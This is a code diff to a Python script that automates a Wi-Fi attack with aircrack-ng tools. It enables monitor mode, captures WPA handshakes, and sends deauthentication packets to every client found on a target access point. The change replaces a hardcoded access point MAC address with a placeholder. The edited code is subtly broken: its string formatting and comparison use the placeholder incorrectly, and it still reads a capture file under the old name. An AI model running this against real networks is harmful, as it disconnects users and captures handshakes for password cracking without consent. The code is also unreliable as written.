@@ -5,7 +5,7 @@ import csv
 import os
 
 def deauth(client):
-    command = "sudo aireplay-ng -0 1 -a 20:A9:0E:40:B3:71 -c {} wlan0mon".format(client)
+    command = "sudo aireplay-ng -0 1 -a {station_bssid} -c {} wlan0mon".format(client)
 
     os.system(command)
 
@@ -20,7 +20,7 @@ for i in range(5, 0):
 os.system("sudo airmon-ng check kill")
 os.system("sudo airmon-ng start wlan0")
 
-wpa_handshake_thread = threading.Thread(target=os.system, args=("sudo airodump-ng -c 1 --bssid 20:A9:0E:40:B3:71 -w sp91 wlan0mon",))
+wpa_handshake_thread = threading.Thread(target=os.system, args=("sudo airodump-ng -c 1 --bssid {station_bssid} -w wpa2crack wlan0mon",))
 wpa_handshake_thread.start()
 
 clients = []
@@ -38,7 +38,7 @@ with open("sp91-01.csv") as file:
             pass
 
 for i in clients:
-    if i != "20:A9:0E:40:B3:71":
+    if i != "{station_bssid}":
         deauth_thread = threading.Thread(target=deauth, args=(i,))
         deauth_thread.start()
 
